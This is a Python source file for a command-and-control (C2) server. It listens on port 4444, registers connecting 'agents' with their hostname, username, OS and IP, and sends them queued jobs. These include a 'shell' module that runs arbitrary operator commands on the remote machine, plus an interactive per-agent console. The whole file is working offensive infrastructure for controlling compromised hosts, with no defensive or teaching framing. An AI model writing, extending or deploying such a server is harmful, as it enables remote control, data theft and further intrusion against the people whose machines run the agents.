#!/usr/bin/env python3
import socket
import threading
import json
import sqlite3
import uuid
import time
from datetime import datetime
import logging
import os

class FastC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.agents = {}  # {agent_id: {'socket': socket, 'thread': thread}}
        self.jobs = {}
        self.running = True
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger('FastC2Server')
        
        self.init_database()
    
    def init_database(self):
        """Initialize SQLite database"""
        self.conn = sqlite3.connect('data/fast_c2.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                architecture TEXT,
                os_version TEXT,
                internal_ip TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT
            )
        ''')
        self.conn.commit()
    
    def start(self):
        """Start the fast C2 server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.logger.info(f"🚀 Fast C2 Server started on {self.host}:{self.port}")
            
            # Start listener
            listener_thread = threading.Thread(target=self.accept_connections)
            listener_thread.daemon = True
            listener_thread.start()
            
            # Start command interface
            self.start_command_interface()
            
        except Exception as e:
            self.logger.error(f"Failed to start server: {e}")
    
    def accept_connections(self):
        """Accept incoming agent connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                client_socket.settimeout(10.0)  # Prevent blocking forever
                
                # Start agent handler in new thread
                agent_thread = threading.Thread(
                    target=self.handle_agent_connection,
                    args=(client_socket, addr)
                )
                agent_thread.daemon = True
                agent_thread.start()
                
            except Exception as e:
                if self.running:  # Only log if we're supposed to be running
                    self.logger.error(f"Error accepting connection: {e}")
    
    def handle_agent_connection(self, client_socket, addr):
        """Handle persistent connection with agent"""
        agent_id = None
        
        try:
            # Receive initial check-in
            data = client_socket.recv(4096).decode('utf-8')
            if not data:
                return
                
            message = json.loads(data)
            agent_id = message.get('agent_id')
            
            if not agent_id or message.get('type') != 'checkin':
                return
            
            # Register agent
            self.register_agent(agent_id, message.get('system_info', {}), addr, client_socket)
            self.logger.info(f"New agent connected: {agent_id} from {addr[0]}")
            
            # Main communication loop
            while self.running and agent_id in self.agents:
                try:
                    # Check for pending jobs
                    if agent_id in self.jobs and self.jobs[agent_id]:
                        job = self.jobs[agent_id].pop(0)
                        client_socket.send(json.dumps(job).encode('utf-8'))
                        self.logger.info(f"Sent job to {agent_id}: {job['module_name']}")
                    
                    # Wait for response with timeout
                    client_socket.settimeout(1.0)  # Short timeout to check for new jobs
                    try:
                        data = client_socket.recv(4096).decode('utf-8')
                        if data:
                            response = json.loads(data)
                            self.handle_agent_response(agent_id, response)
                    except socket.timeout:
                        continue  # No data, check for new jobs
                    except json.JSONDecodeError:
                        continue  # Invalid data, continue
                        
                except Exception as e:
                    self.logger.error(f"Error communicating with {agent_id}: {e}")
                    break
                    
        except Exception as e:
            self.logger.error(f"Agent connection error: {e}")
        finally:
            if agent_id and agent_id in self.agents:
                del self.agents[agent_id]
                self.logger.info(f"Agent disconnected: {agent_id}")
            try:
                client_socket.close()
            except:
                pass
    
    def register_agent(self, agent_id, system_info, addr, socket):
        """Register a new agent"""
        self.agents[agent_id] = {
            'socket': socket,
            'system_info': system_info,
            'ip': addr[0],
            'last_seen': datetime.now()
        }
        
        # Store in database
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                agent_id,
                system_info.get('hostname', 'Unknown'),
                system_info.get('username', 'Unknown'),
                system_info.get('architecture', 'Unknown'),
                system_info.get('os_version', 'Unknown'),
                addr[0],
                datetime.now(),
                datetime.now(),
                'active'
            ))
            self.conn.commit()
        except Exception as e:
            self.logger.error(f"Database error: {e}")
    
    def handle_agent_response(self, agent_id, response):
        """Handle response from agent"""
        if response.get('type') == 'job_result':
            job_id = response.get('job_id')
            output = response.get('output', '')
            
            print(f"\n[📡] INSTANT RESULT from {agent_id}:")
            print(f"    Job: {job_id}")
            print(f"    Output:\n{'-'*40}")
            print(f"{output}")
            print(f"{'-'*40}")
            print(f"C2> ", end='', flush=True)
    
    def send_job(self, agent_id, module_name, arguments=None):
        """Send job to agent (instant delivery)"""
        if agent_id not in self.agents:
            return False
        
        job_id = f"job_{int(time.time())}"
        job = {
            'type': 'job',
            'job_id': job_id,
            'module_name': module_name,
            'arguments': arguments or {}
        }
        
        if agent_id not in self.jobs:
            self.jobs[agent_id] = []
        
        self.jobs[agent_id].append(job)
        self.logger.info(f"Queued job for {agent_id}: {module_name}")
        return True
    
    def start_command_interface(self):
        """Start interactive command interface"""
        def command_loop():
            while self.running:
                try:
                    cmd = input("\nC2> ").strip()
                    self.handle_command(cmd)
                except (KeyboardInterrupt, EOFError):
                    print("\n[!] Shutting down...")
                    self.running = False
                    break
                except Exception as e:
                    print(f"[-] Command error: {e}")
        
        thread = threading.Thread(target=command_loop)
        thread.daemon = True
        thread.start()
    
    def handle_command(self, command):
        if command == 'exit':
            self.running = False
        elif command == 'agents':
            self.list_agents()
        elif command == 'status':
            self.show_status()
        elif command == 'help':
            self.show_help()
        elif command.startswith('jobs '):
            self.handle_job_command(command)
        elif command.startswith('use '):
            self.handle_use_command(command)
        elif command == 'clear':
            os.system('clear')
        else:
            print("Unknown command. Type 'help'")
    
    def list_agents(self):
        if not self.agents:
            print("No active agents")
            return
        
        print(f"\nActive Agents ({len(self.agents)}):")
        print("-" * 60)
        for agent_id, info in self.agents.items():
            sysinfo = info.get('system_info', {})
            print(f"ID: {agent_id}")
            print(f"  IP: {info.get('ip', 'Unknown')}")
            print(f"  Hostname: {sysinfo.get('hostname', 'Unknown')}")
            print(f"  User: {sysinfo.get('username', 'Unknown')}")
            print("-" * 60)
    
    def show_status(self):
        print(f"\n🚀 Fast C2 Server Status:")
        print(f"  Active agents: {len(self.agents)}")
        print(f"  Pending jobs: {sum(len(jobs) for jobs in self.jobs.values())}")
        print(f"  Listening: {self.host}:{self.port}")
    
    def show_help(self):
        print("\n🚀 Fast Mode Commands:")
        print("  agents          - List active agents")
        print("  status          - Show server status")
        print("  use <agent_id>  - Enter interactive mode")
        print("  jobs <agent_id> <module> [args] - Send job")
        print("  clear           - Clear screen")
        print("  exit            - Shutdown server")
        print("  help            - Show this help")
    
    def handle_job_command(self, command):
        try:
            parts = command.split(' ', 3)
            if len(parts) < 3:
                print("Usage: jobs <agent_id> <module> [arguments]")
                return
            
            agent_id = parts[1]
            module_name = parts[2]
            arguments = parts[3] if len(parts) > 3 else ""
            
            args_dict = {}
            if arguments:
                if module_name == 'shell':
                    args_dict = {'command': arguments}
                else:
                    try:
                        args_dict = json.loads(arguments)
                    except:
                        args_dict = {'args': arguments}
            
            if self.send_job(agent_id, module_name, args_dict):
                print(f"[✓] Job sent instantly to {agent_id}")
            else:
                print(f"[-] Agent {agent_id} not found or not connected")
            
        except Exception as e:
            print(f"[-] Job failed: {e}")
    
    def handle_use_command(self, command):
        """Interactive mode with instant responses"""
        parts = command.split(' ')
        if len(parts) < 2:
            print("Usage: use <agent_id>")
            return
        
        agent_id = parts[1]
        if agent_id not in self.agents:
            print(f"[-] Agent {agent_id} not connected")
            return
        
        print(f"[+] Interactive mode with {agent_id} (Instant responses!)")
        print("    Type commands directly or 'back' to exit")
        
        while True:
            try:
                cmd = input(f"\nC2[{agent_id[:8]}]> ").strip()
                if cmd == 'back':
                    break
                elif cmd in ['exit', 'quit']:
                    self.running = False
                    break
                elif cmd:
                    # Send command instantly
                    if cmd.startswith('shell '):
                        module, args = 'shell', {'command': cmd[6:]}
                    else:
                        module, args = cmd, {}
                    
                    if self.send_job(agent_id, module, args):
                        print(f"[→] Command sent instantly...")
                    else:
                        print(f"[-] Failed to send command")
                        
            except (KeyboardInterrupt, EOFError):
                break
            except Exception as e:
                print(f"[-] Error: {e}")

if __name__ == "__main__":
    server = FastC2Server('0.0.0.0', 4444)
    server.start()
    
    # Keep main thread alive
    try:
        while server.running:
            time.sleep(1)
    except KeyboardInterrupt:
        server.running = False